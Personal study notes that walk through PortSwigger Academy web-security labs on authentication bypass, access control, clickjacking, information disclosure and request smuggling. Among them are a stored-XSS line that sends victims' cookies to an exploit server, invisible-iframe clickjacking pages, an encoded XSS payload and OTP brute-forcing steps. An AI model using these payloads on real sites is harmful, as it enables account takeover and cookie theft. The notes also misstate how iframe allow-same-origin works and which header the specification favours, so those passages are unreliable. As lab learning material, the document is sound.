            [appsec-scripts/bypassing-broken-brute-force-protection.py at main · AymanRbati/appsec-scripts](https://github.com/AymanRbati/appsec-scripts/blob/main/bypassing-broken-brute-force-protection.py)
            
        - portswigger solution
            - u use intruder’s Pitchfork
            - in the usernames u alternate between carlos and peter
            - in the passwords u alternate between a password from the list and “peter”
            - so that u try weiner:peter before trying a password fort the user carlos
            
            [https://www.youtube.com/watch?v=n1Nib1IwxuE](https://www.youtube.com/watch?v=n1Nib1IwxuE)
            
    - Username enumeration via account lock
        - theory
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20227.png)
            
        - the idea is very simple and u reported this in many assessments
        - u can enumerate username by trying them many times with a wrong password, if an account gets locked, it’s a valid user
        - solution
            - u try the list of usernames with 5 passwords and u look for the account which will get locked
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20228.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20229.png)
                
            - Next, we lunch a brute force attack with that username and the right payload doesn’t throw any error (which means a difference length for the response)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20230.png)
                
            - i know that’s not realistic, in real life u can’t login with a locked account but that’s how you solve the lab
        - how i solved the lab
            
            just used a cluster bomb
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20231.png)
            
    - 2FA broken logic
        - theory (full explanation)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20232.png)
            
        - lab link with detailled solution
            
            [https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)
            
        - basically, when u log in (first step before 2FA ) there is a cookie called `verify` with the username of the user who completed the first step
        - this cookie indicates to the second step which user should pass the second step to log in
        - the proof is that when u change the value of the cookie to Carlos and use the OTP for weiner, u get “incorrect code”
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20233.png)
            
        - So, now that we only need to have 2FA for carlos, we will simply try bruteforcing the OTP
        - but there must be an OTP for calos in the first place !
        - that’s why we need to send a GET resuest to `/login2` with `verify=carlos`  in repeater
        - in other words
            
            Send the `GET /login2` request to Burp Repeater. 
            
            Change the value of the `verify`parameter to `carlos`  and send the request.
            
             This ensures that a temporary 2FA code is generated for Carlos.
            
        - Next, we brute force the OTP
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20234.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20235.png)
            
        - we copy the generated cookie and access **My account** to solve the lab
        
    - Brute-forcing a stay-logged-in cookie
        - in the lab description and title, they say that we should brute force the cookie
        - the cookie looks like it’s base64, so we decode it, and finally the lab description makes sense !
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20236.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20237.png)
            
        - using Intruder’s payload processing we can generate stay-logged-in cookies with the word list they gave us
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20238.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20239.png)
            
        - we lunch Intruder to access  **My account and** solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20240.png)
            
    - Offline password cracking
        - lab link (read description)
            
            [https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)
            
        - from the lab description, we understand that we should obtain Carlos's `stay-logged-in`cookie using the XSS vulnerability in the comment functionality.
        - they don’t say it explicitly here but carlos will view all the blog posts, so u can steal his cookies with a stored XSS
        - using the XSS payload inside, we post a comment and get the victim’s cookies in the exploit server
            - if you don’t use https u ll get an error !!!
            
            ```xml
            <script>fetch('https://exploit-0a4600d90420aca7c073639a01f100e3.exploit-server.net/exploit?cookie='+document.cookie)</script>
            ```
            
            we know it’s the victim’s cookies because it’s a different IP and different cookies from ours
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20241.png)
            
        - using the stay-logged-in cookie that i grabbed, i  logged in as carlos and tried to delete his account to solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20242.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20243.png)
            
        - we need password to delete the account !
        - so i decoded the base64 encoded cookie and grabbed the md5 hash of the password of carlos (cuz the cookie has the same structure as in the previous lab)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20244.png)
            
        - like expected, they used an easy to crack word since i simply cracked it online
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20245.png)
            
        - i entered the clear text password to solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20246.png)
            
        
    - Password reset poisoning via middleware
        - theory and detailed solution (must read)
            
            [https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)
            
            [https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)
            
        - Basically, the idea here is that u can change the domain of the password reset url which get sent by email, using an http header.
        - it’s the **X-Forwarded-Host** header
            
            Host names and ports of reverse proxies (load balancers, CDNs) may differ from the origin server handling the request, 
            
            in that case the `X-Forwarded-Host`header is useful to determine which Host was originally used.
            
            [X-Forwarded-Host - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host)
            
        - Also, notice that the password reset is done using only random token (which identifies the user to the server) and they don’t ask for old password during reset.
        - the `X-Forwarded-Host`header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain.
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20247.png)
            
        - we get the token of the password reset feature
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20248.png)
            
        - we use the password reset feature for our user wiener and change the token in the request
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20249.png)
            
        - we login using the username carlos and the new password that we set and voila !
    - Password brute-force via password change
        - lab link and detailed solution
            
            [https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
            
        - when u experiment with the password change functionality, you would observe :
            - the username is submitted as hidden input in the request.
            - if the two entries for the new password match, the account is locked
            - However, if you enter two different new passwords and a wrong current password, an error message simply states `Current password is incorrect`
            - If you enter a valid current password, but two different new passwords, the message says `New passwords do not match`
        - We can use this two last messages to enumerate correct passwords.
        - Intruder request ( payloads are the passwords provided in lab description)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20250.png)
            
        - we lunch intruder and get the right password giving the message `New passwords do not match`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20251.png)
            
        - we log as Carlos and access “My account” to solve the lab
- Broken Access Control
    - Unprotected admin functionality
        - This lab has an unprotected admin panel and u can solve the lab by deleting the user `carlos`.
        - We keep trying endpoint for admin panel like : admin, administrator, panel, admin-panel
        - We access the admin panel by using the endpoint `/admin-panel` and we delete the user Carlos.
    - Unprotected admin functionality with unpredictable URL
        - if we take a look at the source code of the page, we’ll find the following JS script which contains the endpoint of the admin panel, delete carlos and solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20252.png)
            
        - you can also check robots.txt
    - User role controlled by request parameter
        - lab link
            
            [https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter](https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter)
            
        - login, intercept http request and change the following cookie value to true
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20253.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20254.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20255.png)
            
        - another way to do it using browser only
            - u change the value of the cookie and the “Admin panel” href appear
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20256.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20257.png)
            
    - User role can be modified in user profile
        - when u login with wiener, u get an email change feature
        - when u change the email, u can see the user’s role in the response
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20258.png)
            
        - so we change the user’s role too in the POST request ( mass assignment)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20259.png)
            
        - Now, we can access the admin panel and delete carlos
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20260.png)
            
    - User ID controlled by request parameter
        - u click on ”My account”, intercept the request,  simply change the name of the user in the following request
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20261.png)
            
    - User ID controlled by request parameter, with unpredictable user IDs
        - lab link
            
            [https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids)
            
        - in order to find the GUID of the user carlos, i checked the source code of blog posts, and found the id in an article written by Carlos
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20262.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20263.png)
            
        - u can also get the ID by using burp, since the browser will access the link u found in the source code when u’re trying to view Carlos’s article
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20264.png)
            
        - then, like the previous lab, we use the following endpoint to get the api key, submit and solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20265.png)
            
    - User ID controlled by request parameter with data leakage in redirect
        - when we change the name of the user to Carlos in the following request, we get a 302 containing the API key of Carlos
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20266.png)
            
        - Next, we grab the API key and submit it to silve the lab
        
    - User ID controlled by request parameter with password disclosure
        - when wwe login with weiner, we notice Input in the password field which is a vulnerability since password can be stolen with an XSS for example
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20267.png)
            
        - when we change the name of the user to Administrator in the following endpoint, we can see carlos’s password
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20268.png)
            
        - then we use this password to log in and delete Carlos from the admin panel
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20269.png)
            
    - Insecure direct object references
        - create a chat and intercept the request of viewing transcript
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20270.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20271.png)
            
        - change the filename in the request to 1.txt and u’ll find carlos’s password
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20272.png)
            
        - login with Carlos to solve the lab
    - URL-based access control can be circumvented
        - the `X-Original-URL`header
            - chat gpt definition
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20273.png)
                
            - rana definition
                
                 it's a non standard http header that can be used to overwrite the URL in the original request
                
        - A good resource
            
             the section “****Testing for Special Request Header Handling****” in the following link 
            
            [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema)
            
        - lab url
            
            [https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)
            
        - Solution steps
            - first 3 points to test if we have an access control vulnerability
            - we first send a normal request without the header and observe the response
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20274.png)
                
            - Then, we add the non standard header with a value of a page that doesn’t exist
                - by using the header, we’re basically saying overwrite the endpoint `/` with the endpoint  `/doesnotexist43243` :
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20275.png)
                    
            - when we see a `404` or a `not found` (which is the case here), this indicates that the application supports this non standard header
            - we know that there is a directory /admin since it returns "Access denied" instead of a "not found" message
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20276.png)
                
            - So, we use the header with the value  `/admin` and endpoint `/` , this gives us access to the admin panel
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20277.png)
                
            - if we try to delete Carlos directly, we will get an “Access denied” since there is validation in place
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20278.png)
                
            - we should re-exploit the vulnerability and put http parameters in the request and not in the header value,
                - parameters will be appended to the request made to the endpoint in http header value ( `/admin/delete`)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20279.png)
                
        - if validation is done in the front end and the application allows you to use this header to overwrite the firectory that u wanna visit, then u might be able to bypass this access control and access the admin panel
        
    - Method-based access control can be circumvented
        - logged in as admin, intercepted the request of upgrading the user wiener
        - tried to replay the request using the session cookie of wiener, it didn’t work
        - using burp’s change method button, changed the request to GET and sent it, followed redeirection, lab solved
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20280.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20281.png)
            
    - Multi-step process with no access control on one step
        - when we login as admin, we notice that upgrading/downgrading a user is done by a multi-step process, the 2 requests in green
            
            in the second step, they ask you “are you sure” in the UI, which translates to “confirmed=true” in burp
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20282.png)
            
        - so we try using the second step directly with burp using wiener’s session cookie
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20283.png)
            
        - when we refresh the lab in the browser, we get “Congratulations, you solved the lab!”
    - Referer-based access control
        - u simply intercept the request of upgrading a user
        - change the session to wiener and also the username to wieneer (the part that i forgot !!)
        - and the upgrade should work which solves the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20284.png)
            
        - the application is using referer header in order to perform access control decisions which is wrong because the header is client controllable
        
    
    [https://www.youtube.com/watch?v=2WzqH6N-Gbc](https://www.youtube.com/watch?v=2WzqH6N-Gbc)
    
- Clickjacking
    - Basic clickjacking with CSRF token protection
        - video solution (full explanation)
            
            [https://www.youtube.com/watch?v=_tz0O5-cndE](https://www.youtube.com/watch?v=_tz0O5-cndE)
            
        - video solution using  “Burp Clickbandit” ( a tool available in Burp pro)
            
            [https://www.youtube.com/watch?v=0gfrivSWteY](https://www.youtube.com/watch?v=0gfrivSWteY)
            
        - solution
            - we login and modify the script given by portswigger to make sure that the word “CLICK” is in the same position as “Delete account”
                - malicious page code
                    
                    ```html
                    <head>
                    	<style>
                    		#target_website {
                    			position:relative;
                    			width:1280px;
                    			height:1280px;
                    			z-index:2;
                    			opacity:0.0001;
                    			}
                    		div{
                    			position:absolute;
                    			top:525px;
                    			left:135px;
                    			z-index:1;
                    			}
                    	</style>
                    </head>
                    <body>
                    	<div>CLICK</div> 
                    	<iframe id="target_website" src="https://0a4c001704c70ae6c0051d0b0099006a.web-security-academy.net/my-account">
                    	</iframe>
                    </body>
                    ```
                    
                    - the more you reduce `opacity` the less visible is the target/victim website
                    - the `z-index` makes sure that the victim website is behind the attacker’s div element
                - the previous code solves the lab
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20285.png)
                    
                - u may have to wait 30 seconds to get the “congrats message”
                - you only need to have an opacity of 0.1 to solve the lab (but always better to reduce it more)
    - Clickjacking with a form input data prefilled from a URL parameter
        - The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.
        - after login, notice that you can fill the email input by using an URL that looks like this
            
            ```html
            [https://0a1d005404760facc2f61118003c00e8.web-security-academy.net/my-account?email=b@c.com](https://0a1d005404760facc2f61118003c00e8.web-security-academy.net/my-account?email=b@c.com)
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20286.png)
            
        - using this URL, we update the code from the previous lab to solve the challenge
            
            ```html
            <head>
            	<style>
            		#target_website {
            			position:relative;
            			width:1280px;
            			height:1280px;
            			z-index:2;
            			opacity:0.001;
            			}
            		div{
            			position:absolute;
            			top:500px;
            			left:130px;
            			z-index:1;
            			}
            	</style>
            </head>
            <body>
            	<div>Click me</div> 
            	<iframe id="target_website" src="https://0a1d005404760facc2f61118003c00e8.web-security-academy.net/my-account?email=b@b.com">
            	</iframe>
            </body>
            ```
            
        - notice that the message to solve the lab is “Click me” and not “Click” (like the previous lab)
        - u may have to wait 30 seconds to get the “congrats message”
    - Clickjacking with a frame buster script
        - theory part
            - check “Frame busting scripts” in the following URL
                
                [https://portswigger.net/web-security/clickjacking](https://portswigger.net/web-security/clickjacking)
                
            - what does sandboxing the iframe do ?
                
                The term "sandbox" in an iframe in web development refers to a security feature that restricts the actions of the content within the iframe. The sandbox attribute allows developers to specify certain restrictions on the content within an iframe, such as preventing it from running JavaScript or accessing cookies.
                
                The value "allow-forms" specifically allows the content within the iframe to submit forms. This means that if the iframe contains a form, the user can fill it out and submit it within the iframe, but the content within the iframe will still be restricted by the other sandbox restrictions.
                
                Other values for the sandbox attribute include "allow-scripts" to allow the content within the iframe to run JavaScript, "allow-same-origin" to restrict the content within the iframe to the same origin as the parent page, and "allow-top-navigation" to allow the content within the iframe to navigate the top-level browsing context.
                
        - Escaping frame busters trick
            
            `<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>`
            
            When this is set with the `allow-forms`or `allow-scripts`values and the `allow-top-navigation` value is excluded, then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window
            
            How i understood it : we’re trying to block the target website client side code which runs in the iframe from knowing if it’s run in a top level navigation by using a sandbox (the HTML5 iframe `sandbox`attribute).
            
        - Solution code
            
            ```html
            <head>
            	<style>
            		#target_website {
            			position:relative;
            			width:1280px;
            			height:1280px;
            			z-index:2;
            			opacity:0.1;
            			}
            		div{
            			position:absolute;
            			top:500px;
            			left:130px;
            			z-index:1;
            			}
            	</style>
            </head>
            <body>
            	<div>Click me</div> 
            	<iframe sandbox="allow-forms" id="target_website" src="https://0a0e001f04354df6c1f49e71003800b3.web-security-academy.net/my-account?email=a@a.com">
            	</iframe>
            </body>
            ```
            
    - Exploiting clickjacking vulnerability to trigger DOM-based XSS
        - lab description
            - This lab contains an [XSS](https://portswigger.net/web-security/cross-site-scripting) vulnerability that is triggered by a click.
            - Construct a [clickjacking attack](https://portswigger.net/web-security/clickjacking) that fools the user into clicking the "Click me" button to call the `print()` function.
        - video solution
            
            [https://youtu.be/hqXAgFQXOH0](https://youtu.be/hqXAgFQXOH0)
            
        - solution
            - found the XSS here
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20287.png)
                
            - made a link to set the right values in the form
                
                ```html
                https://0ad8002f04eb0c0dc15a12ca007600df.web-security-academy.net/feedback?name=%%3c%69%6d%67%20%73%72%63%3d%65%20%6f%6e%65%72%72%6f%72%3d%27%70%72%69%6e%74%28%29%27%20%2f%3e&email=a@a.com&subject=s&message=m
                ```
                
            - generated the code for the clickjacking that works when clicking on it
                
                ```html
                
                <head>
                	<style>
                		#target_website {
                			position:relative;
                			width:1280px;
                			height:1280px;
                			z-index:2;
                			opacity:0.0001;
                			}
                		div{
                			position:absolute;
                			top:835px;
                			left:250px;
                			z-index:1;
                			}
                	</style>
                </head>
                <body>
                	<div>Click me</div> 
                	<iframe id="target_website" src="https://0ad8002f04eb0c0dc15a12ca007600df.web-security-academy.net/feedback?name=%3c%69%6d%67%20%73%72%63%3d%65%20%6f%6e%65%72%72%6f%72%3d%27%70%72%69%6e%74%28%29%27%20%2f%3e&email=a@a.com&subject=s&message=m">
                	</iframe>
                </body>
                ```
                
            - perhaps my width and height were not good (not covering all the screen, maybe)
                
                ```html
                width:1280px;
                height:1280px;
                ```
                
            - code that helped me solve the lab (copied CSS from the youtube video)
                
                ```html
                <head>
                	<style>
                		#target_website {
                			position:relative;
                			width:1280px;
                			height:1280px;
                			z-index:2;
                			opacity:0.0001;
                			}
                		div{
                			position:absolute;
                			top:835px;
                			left:250px;
                			z-index:1;
                			}
                	</style>
                </head>
                <body>
                	<div>Click me</div> 
                	<iframe id="target_website" src="https://0ad8002f04eb0c0dc15a12ca007600df.web-security-academy.net/feedback?name=%3c%69%6d%67%20%73%72%63%3d%65%20%6f%6e%65%72%72%6f%72%3d%27%70%72%69%6e%74%28%29%27%20%2f%3e&email=a@a.com&subject=s&message=m">
                	</iframe>
                </body>
                ```
                
    - Multistep clickjacking
        - basically the challenge is to prepare a malicious page containing 2 clicks because you get a confirmatiion prompt when u click “delete account”
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20288.png)
            
        - nothing magical, you just add the right position of each position
            
            ```html
            <head>
            	<style>
            		#target_website {
            			position:relative;
            			width:1280px;
            			height:1280px;
            			z-index:2;
            			opacity:0.1;
            			}
            		#first{
            			position:absolute;
            			top:535px;
            			left:125px;
            			z-index:1;
            			}
                           #second{
            			position:absolute;
            			top:335px;
            			left:105px;
            			z-index:1;
            			}
            	</style>
            </head>
            <body>
            	<div id="first">Click me first</div> 
                    <div id="second">Click me next</div> 
            	<iframe id="target_website" src="https://0a6600a904d06bc1c0eb7def00740072.web-security-academy.net/my-account">
            	</iframe>
            </body>
            ```
            
        - funny thing, i was making “click next” on “not, take me back” and not “YES” at some point
        - this solves the challenge
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20289.png)
            
        
- Information disclosure
    - Information disclosure in error messages
        - lab link
            
            This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the version number of this framework.
            
            [https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages)
            
        - looking at the http requests with burp, found a request with a GET t parameter having the value 1, so i changed that to a letter and triggered errors
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20290.png)
            
        - got the version “2 2.3.31” of Apache Struts from the previous stack trace, submitted the value to solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20291.png)
            
        
    - Information disclosure on debug page
        - lab link and description
            - This lab contains a debug page that discloses sensitive  information about the application. To solve the lab, obtain and submit 
            the `SECRET_KEY` environment variable.
            
            [https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page)
            
        - there is nothing interesting in the endpoints that the lab uses to get the data
        - so i did “Directory bruteforcing” using Burp pro’s “Directories - Long” list
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20292.png)
            
        - the endpoint having a different response length was “cgi-bin”
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20293.png)
            
        - it was a directory listing containing one file “phpinfo.php” which had the secret key to solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20294.png)
            
    - Source code disclosure via backup files
        - lab link and description
            
            This lab leaks its source code via backup files in a hidden directory. To solve the lab, identify and submit the database password, which is hard-coded in the leaked source code.
            
            [https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files)
            
        - since they mentioned a a hidden directory in the description, we do “directory bruteforcing” like in the previous lab
            
            again we use “Directories - Long” as a wordlist
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20295.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20296.png)
            
        - Using the file “ProductTemplate.java.bak” in the found directory, we find the password and we submit it to solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20297.png)
            
    - Authentication bypass via information disclosure
        - lab link
            
            [https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)
            
        - we lunch Burp scanner and notice that http TRACE method is enabled (like the example they talked about in the course)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20298.png)
            
        - this helps us find the custom HTTP header used by the front-end (mentioned in the lab’s description)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20299.png)
            
        - we login, access `/admin`  and add the header `X-Custom-Ip-Authorization: 127.0.0.1`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20300.png)
            
        - using our admin access, we delete carlos and solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20301.png)
            
    - Information disclosure in version control history
        - lab link
            
            [https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)
            
        - Notice that we can access the folder  `/.git` which stores all of the version control data
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20302.png)
            
        - i started by downloading the directory
            
            ```jsx
            wget --recursive --no-parent https://0a6e0047042a94238199ed8f0078006b.web-security-academy.net/.git
            ```
            
        - my next goal is using my local installation of Git to gain access to the website's version control history (which is in the local folder )
            - we start by using **`git log`** which shows  the commit history, including commit messages, dates, and authors
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20303.png)
                
            - Next, we use **`git show <commit>`**
                
                Replace **`<commit>`** with the hash of a specific commit to view the details of that particular commit, including the changes made.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20304.png)
                
        - Using the password found, we log in as administrator and delete carlos to solve the lab
        - check solution video where the german guy uses use “Git Cola” tool in kali to undo the last commit and find the password
            
            [https://youtu.be/4Zt71Il1omc](https://youtu.be/4Zt71Il1omc)
            
- http request smuggling
    - resources
        
        [https://www.youtube.com/watch?v=_A04msdplXs](https://www.youtube.com/watch?v=_A04msdplXs)
        
        [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
        
        [https://www.youtube.com/watch?v=CpVGc1N_2KU](https://www.youtube.com/watch?v=CpVGc1N_2KU) 
        
        - specification says that if both headers are present, content-length should be used. but Devs don’t always follow standards.
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20305.png)
            
        - So servers may accepts both of these headers and favor one of them.
        - the easiest way to protect against this is to block requests having both headers (or only use http2 end to end)
        
